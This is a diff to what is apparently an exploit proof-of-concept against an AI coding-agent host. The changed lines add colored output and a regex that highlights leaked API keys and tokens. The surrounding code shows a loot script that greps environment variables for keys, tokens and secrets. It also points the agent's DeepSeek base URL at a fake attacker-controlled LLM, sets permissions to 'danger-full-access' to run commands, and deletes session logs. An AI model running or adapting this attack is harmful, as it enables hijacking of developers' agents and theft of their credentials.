@@ -21,6 +21,35 @@ from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE
 
+_USE_COLOR = sys.stdout.isatty() and not __import__("os").environ.get("NO_COLOR")
+_C = {"g": "\033[32m", "r": "\033[31m", "y": "\033[33m", "c": "\033[36m",
+      "b": "\033[1m", "d": "\033[2m", "0": "\033[0m"} if _USE_COLOR else dict.fromkeys("grycbd0", "")
+_ANSI = re.compile(r"\033\[[0-9;]*m")
+
+
+def ok(msg):
+    print(f"{_C['g']}[+]{_C['0']} {msg}")
+
+
+def info(msg):
+    print(f"{_C['c']}[*]{_C['0']} {msg}")
+
+
+def bad(msg):
+    print(f"{_C['r']}[-]{_C['0']} {msg}")
+
+
+_KEY_RE = re.compile(r'(sk-[A-Za-z0-9._-]{16,}|ark-[0-9a-fA-F-]{20,}|sk_tr_[A-Za-z0-9_-]{16,}'
+                     r'|sk-kimi-[A-Za-z0-9]{16,}|ghp_[A-Za-z0-9]{20,}|glpat-[A-Za-z0-9_-]{20,}'
+                     r'|AKIA[0-9A-Z]{16}|xox[baprs]-[A-Za-z0-9-]{10,})')
+
+
+def section(label, body):
+    if _USE_COLOR:
+        body = _KEY_RE.sub(lambda m: f"{_C['r']}{_C['b']}{m.group(0)}{_C['0']}", body)
+    print(f"{_C['y']}{_C['b']}----- {label} output -----{_C['0']}\n{body}\n"
+          f"{_C['y']}{_C['b']}----- end -----{_C['0']}")
+
 LOOT_SCRIPT = r'''
 echo "== env"; env | grep -iE 'key|token|secret|passwd' | head -40
 echo "== home"; ls -la ~ 2>/dev/null | head -40
@@ -238,14 +267,14 @@ def main():
 
     class Tee:
         def write(self, s):
-            sys.__stdout__.write(s); logf.write(s); logf.flush()
+            sys.__stdout__.write(s); logf.write(_ANSI.sub("", s)); logf.flush()
         def flush(self):
             sys.__stdout__.flush(); logf.flush()
     sys.stdout = Tee()
 
     t = Target(a.target)
     desc = t.must("host.describe", {})
-    print(f"[+] target alive: provider={desc.get('provider')} cwd={desc.get('cwd')}")
+    ok(f"target alive: provider={_C['b']}{desc.get('provider')}{_C['0']} cwd={desc.get('cwd')}")
 
     cmds = list(a.cmd)
     if not cmds or a.loot_keys:
@@ -254,8 +283,8 @@ def main():
     fake = None
     marker = "diag-" + base64.b16encode(__import__("os").urandom(6)).decode().lower()
     snap = snapshot(t)
-    print(f"[*] snapshot: baseURL user-set={snap['had_baseURL']} "
-          f"perm={snap['perm']!r} cred configured={snap['cred_configured']}")
+    info(f"snapshot: baseURL user-set={snap['had_baseURL']} "
+         f"perm={snap['perm']!r} cred configured={snap['cred_configured']}")
 
     cred_we_set = False
     host, port = a.listen.rsplit(":", 1)
@@ -268,17 +297,17 @@ def main():
     public = a.public_base or f"http://127.0.0.1:{port}/v1"
     t.must("settings.mutate", {"ns": "llm-deepseek", "ops": [
         {"op": "set", "path": ["baseURL"], "value": public}]})
-    print(f"[+] llm-deepseek.baseURL -> {public} (fake LLM on {a.listen})")
+    print(f"{_C['g']}[+]{_C['0']} llm-deepseek.baseURL -> {_C['b']}{public}{_C['0']} (fake LLM on {a.listen})")
     if not snap["cred_configured"]:
         t.must("credentials.set", {"ref": "DEEPSEEK_API_KEY", "value": "sk-poc"})
         cred_we_set = True
-        print("[+] dummy credential set (none was configured)")
+        ok("dummy credential set (none was configured)")
 
     t.must("settings.mutate", {"ns": "permission", "ops": [
         {"op": "set", "path": ["defaultPreset"], "value": "danger-full-access"}]})
 
     sid = t.must("session.create", {})["sessionId"]
-    print(f"[+] session {sid}")
+    ok(f"session {_C['b']}{sid}{_C['0']}")
     t.rpc("agentPreset.select", {"sessionId": sid, "agentPreset": "minimal"})
 
     if fake and not a.no_cleanup:
@@ -296,24 +325,24 @@ def main():
                                      "content": [{"type": "text", "text": text}]})
             if is_clean:
                 time.sleep(15)  # fs cleanup deletes the session log; turn/end unreadable
-                print("[*] cleanup command delivered (session storage self-deleted)")
+                info("cleanup command delivered (session storage self-deleted)")
                 break
             reason = t.wait_turn(sid)
             label = f"cmd[{i}]"
             if reason.get("kind") != "completed":
-                print(f"[-] {label}: turn ended early: {json.dumps(reason)[:200]}")
+                bad(f"{label}: turn ended early: {json.dumps(reason)[:200]}")
                 break
             texts = t.tool_texts(sid)
             new = texts[len(results):]
             results = texts
             for tx in new:
-                print(f"----- {label} output -----\n{unwrap_b64(tx)}\n----- end -----")
+                section(label, unwrap_b64(tx))
     finally:
         if not a.no_cleanup:
-            print("[*] restoring target state...")
+            info("restoring target state...")
             t.rpc("workspace.archiveSession", {"sessionId": sid})
             restore(t, snap, cred_we_set)
-            print("[+] session archived, settings/credentials restored")
+            ok("session archived, settings/credentials restored")
         if fake:
             fake.stop()
 
